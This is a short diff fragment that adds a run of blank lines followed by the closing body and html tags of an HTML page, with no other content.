+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
